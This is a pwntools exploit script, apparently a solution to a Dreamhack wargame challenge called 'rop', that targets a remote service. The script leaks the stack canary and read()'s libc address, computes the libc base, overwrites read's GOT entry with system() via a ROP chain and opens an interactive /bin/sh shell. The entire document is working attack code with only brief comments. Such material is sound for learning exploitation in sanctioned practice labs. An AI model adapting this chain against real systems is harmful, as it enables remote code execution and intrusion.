from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

context.log_level = 'debug'

p = remote("host1.dreamhack.games", 13782)
# p = process("./rop")
e = ELF("./rop")

# gdb.attach(p)

# [1] Get information about buf
buf2sfp = 0x30+0x8+0x8
buf2cnry = buf2sfp - 8

slog("buf <=> sfp", buf2sfp)
slog("buf <=> canary", buf2cnry)

# [2] Get Canary
payload = b"A"*(buf2cnry+1)

p.recvuntil(b"Buf: ")
p.send(payload) #sendline is have \n

p.recvuntil(payload)
tmp=p.recvn(7) #64bit
cnry = u64(b"\x00"+tmp)

slog("Canary", cnry)

# [3] Get offset of system
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
read_symbol = 0x0000000000110140
system_symbol = 0x000000000004f550
readtosystem = read_symbol-system_symbol
slog("read2System", readtosystem)

# [3] Exploit
pop_rdi = int("0x00000000004007f3", 16)
# binsh= int("0x400874", 16)
pop_rsi_r15 = int("0x00000000004007f1", 16)
puts_plt = e.plt['puts']
# puts_plt = int("0x400570", 16)

justret = int("0x000000000040055e", 16)
# ret2main = int("0x0000000000400749", 16)

read_plt = e.plt['read']
read_got = e.got['read']

# Canary bypass
payload = b"A"*buf2cnry
payload += p64(cnry)
payload += b"B"*0x8

# for get read() address - exploit : puts() call
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt) # puts(read_got) read() address print not call read()

# back to main+0
ret2main = 0x00000000004006a7
# payload += p64(justret)
payload += p64(ret2main)

p.recvuntil(b"Buf: ")
p.send(payload) #sendline is have \n

read_addr = u64(p.recvn(6)+b"\x00"*2)
# p.recvline()
slog("read()", read_addr)

libc_base = read_addr - read_symbol
# slog("read offset", libc.symbols["read"])
slog("lb", libc_base)

system_addr = libc_base + system_symbol
slog("system()", system_addr)

print("One more attack..")
# Canary bypass
payload = b"A"*buf2cnry
payload += p64(cnry)
payload += b"B"*0x8
# read(0, [read_got], 0x10)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
# payload += p64(read_got) + p64(0x10)
payload += p64(read_got) + p64(0)
# ret2main_read = 0x0000000000400769
# payload += p64(ret2main_read)
payload += p64(read_plt)
# read input is uhm...

# system("/bin/sh")
payload += p64(justret)
payload += p64(pop_rdi)
payload += p64(read_got+0x8) #"/bin/sh"
payload += p64(read_plt) #[read_got] == system()

p.recvuntil(b"Buf: ")
p.sendline(b"Juntheworld") #sendline is have \n
p.recvuntil(b"Buf: ")
p.send(payload) #sendline is have \n

p.send(p64(system_addr)+b"/bin/sh\x00")
# sleep(1)
p.interactive()